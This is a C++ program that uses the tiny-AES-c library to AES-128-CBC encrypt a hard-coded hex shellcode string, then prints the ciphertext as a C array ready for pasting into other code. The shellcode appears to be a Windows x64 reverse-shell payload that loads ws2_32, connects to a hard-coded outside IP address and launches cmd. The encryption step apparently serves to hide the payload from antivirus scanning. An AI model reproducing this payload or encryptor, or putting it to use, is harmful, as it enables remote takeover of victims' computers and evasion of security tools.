#include <iostream>
#include <vector>
#include <string>
#include <iomanip>    // For std::hex, std::setfill, std::setw
#include <stdexcept>  // For std::runtime_error
#include <algorithm>  // For std::min
#include <cstring>    // For memcpy
#include <sstream>    // For std::stringstream
#include "Headers/aes.h" // tiny-AES-c header


// --- Helper function to convert hex string to byte vector ---
std::vector<uint8_t> hex_to_bytes(const std::string& hex_str) {
    if (hex_str.length() % 2 != 0) {
        throw std::runtime_error("Hex string length must be even.");
    }
    std::vector<uint8_t> bytes;
    for (size_t i = 0; i < hex_str.length(); i += 2) {
        std::string byte_str = hex_str.substr(i, 2);
        bytes.push_back(static_cast<uint8_t>(std::stoi(byte_str, nullptr, 16)));
    }
    return bytes;
}

// --- PKCS#7 Padding and Unpadding Functions ---
// (Simplified, assumes block size 16 bytes)

// Function to add PKCS#7 padding
std::vector<uint8_t> add_pkcs7_padding(const std::vector<uint8_t>& data, size_t block_size) {
    // FIX: Changed data.length() to data.size()
    size_t padding_needed = block_size - (data.size() % block_size);
    if (padding_needed == 0) {
        padding_needed = block_size; // If already a multiple, add a full block of padding
    }

    std::vector<uint8_t> padded_data = data; // Copy original data
    padded_data.insert(padded_data.end(), padding_needed, static_cast<uint8_t>(padding_needed));
    return padded_data;
}

// Function to remove PKCS#7 padding
std::vector<uint8_t> remove_pkcs7_padding(const std::vector<uint8_t>& padded_data) {
    if (padded_data.empty()) {
        return {};
    }

    uint8_t padding_value = padded_data.back();
    // FIX: Changed padded_data.length() to padded_data.size()
    if (padding_value == 0 || padding_value > padded_data.size()) {
        // Invalid padding value or padding length exceeds data size
        throw std::runtime_error("Invalid PKCS#7 padding.");
    }

    // Check if all padding bytes have the correct value
    for (size_t i = 0; i < padding_value; ++i) {
        if (padded_data[padded_data.size() - 1 - i] != padding_value) {
            throw std::runtime_error("Invalid PKCS#7 padding (byte mismatch).");
        }
    }

    // Return a new vector without the padding
    return std::vector<uint8_t>(padded_data.begin(), padded_data.end() - padding_value);
}

// Helper to print bytes in hexadecimal
void print_hex(const std::vector<uint8_t>& data, const std::string& label = "") {
    if (!label.empty()) {
        std::cout << label << ": ";
    }
    std::cout << std::hex << std::setfill('0');
    for (uint8_t b : data) {
        std::cout << std::setw(2) << static_cast<int>(b);
    }
    std::cout << std::dec << std::endl; // Reset to decimal for general output
}

int main() {
    // Define AES key (16 bytes for AES128, 24 for AES192, 32 for AES256)
    // NOTE: In a real application, GENERATE THIS RANDOMLY AND SECURELY!
    // This example uses a fixed key for simplicity, which is INSECURE for production.
    uint8_t key[] = {
        0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6,
        0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C
    }; // AES128 key (16 bytes)

    // Define Initialization Vector (IV) - 16 bytes for CBC mode
    // NOTE: In a real application, GENERATE THIS RANDOMLY FOR EACH ENCRYPTION!
    // It does not need to be secret but must be unique.
    uint8_t iv[] = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0A
    };

    // The shellcode as a hex string
    std::string shellcode_hex_str ="fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200b13ec1a1c16341544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5";
    std::vector<uint8_t> shellcode_bytes;
    try {
        shellcode_bytes = hex_to_bytes(shellcode_hex_str);
    } catch (const std::exception& e) {
        std::cerr << "Error converting hex string to bytes: " << e.what() << std::endl;
        return 1;
    }

    std::cout << "Original Shellcode Length: " << shellcode_bytes.size() << " bytes" << std::endl;
    print_hex(shellcode_bytes, "Original Shellcode (hex)");

    // 1. Add PKCS#7 padding to the shellcode bytes
    std::vector<uint8_t> padded_shellcode_bytes = add_pkcs7_padding(shellcode_bytes, AES_BLOCKLEN);
    std::cout << "Padded Shellcode Length: " << padded_shellcode_bytes.size() << " bytes" << std::endl;
    print_hex(padded_shellcode_bytes, "Padded Shellcode (hex)");

    // Prepare buffer for ciphertext
    std::vector<uint8_t> ciphertext_bytes(padded_shellcode_bytes.size());

    // Context for AES operation
    struct AES_ctx ctx;

    // --- Encryption ---
    try {
        // Initialize AES context with the key
        AES_init_ctx(&ctx, key);

        // Copy IV to a temporary buffer as tiny-AES-c modifies it during encryption
        uint8_t current_iv[AES_BLOCKLEN];
        memcpy(current_iv, iv, AES_BLOCKLEN);

        // Set the IV for CBC mode
        AES_ctx_set_iv(&ctx, current_iv);

        // Encrypt the padded shellcode buffer
        // Note: AES_CBC_encrypt_buffer modifies the input buffer in-place
        // So we encrypt a copy of the padded plaintext
        std::vector<uint8_t> encrypt_temp_buffer = padded_shellcode_bytes;
        AES_CBC_encrypt_buffer(&ctx, encrypt_temp_buffer.data(), encrypt_temp_buffer.size());

        // Copy encrypted data to our ciphertext_bytes vector
        std::copy(encrypt_temp_buffer.begin(), encrypt_temp_buffer.end(), ciphertext_bytes.begin());

        print_hex(ciphertext_bytes, "Ciphertext (hex)");

        // Optionally, print the ciphertext in a C-style array format for easy copy-pasting into other code
        std::cout << "\nCiphertext (C array format):" << std::endl;
        std::cout << "unsigned char encrypted_shellcode[] = {";
        for (size_t i = 0; i < ciphertext_bytes.size(); ++i) {
            std::cout << "0x" << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(ciphertext_bytes[i]);
            if (i < ciphertext_bytes.size() - 1) {
                std::cout << ", ";
                if ((i + 1) % 16 == 0) { // Newline every 16 bytes for readability
                    std::cout << "\n    ";
                }
            }
        }
        std::cout << std::dec << "};" << std::endl; // Reset to decimal

    } catch (const std::exception& e) {
        std::cerr << "Encryption Error: " << e.what() << std::endl;
        return 1;
    }

    // --- Decryption ---
    std::vector<uint8_t> decrypted_bytes(ciphertext_bytes.size());

    try {
        // Initialize AES context with the key again for decryption
        AES_init_ctx(&ctx, key);

        // Copy IV to a temporary buffer for decryption
        uint8_t current_iv_decrypt[AES_BLOCKLEN];
        memcpy(current_iv_decrypt, iv, AES_BLOCKLEN);

        // Set the IV for decryption
        AES_ctx_set_iv(&ctx, current_iv_decrypt);

        // Decrypt the ciphertext buffer
        // Note: AES_CBC_decrypt_buffer modifies the input buffer in-place
        std::vector<uint8_t> decrypt_temp_buffer = ciphertext_bytes;
        AES_CBC_decrypt_buffer(&ctx, decrypt_temp_buffer.data(), decrypt_temp_buffer.size());

        // Copy decrypted data
        std::copy(decrypt_temp_buffer.begin(), decrypt_temp_buffer.end(), decrypted_bytes.begin());

        print_hex(decrypted_bytes, "\nDecrypted (padded) hex");

        // 2. Remove PKCS#7 padding from the decrypted data
        std::vector<uint8_t> recovered_shellcode_bytes = remove_pkcs7_padding(decrypted_bytes);
        print_hex(recovered_shellcode_bytes, "Recovered Shellcode (hex)");

        // Verify
        if (shellcode_bytes == recovered_shellcode_bytes) {
            std::cout << "Decryption successful! Recovered shellcode matches original." << std::endl;
        } else {
            std::cout << "Decryption failed! Recovered shellcode does NOT match original." << std::endl;
        }

    } catch (const std::exception& e) {
        std::cerr << "Decryption Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}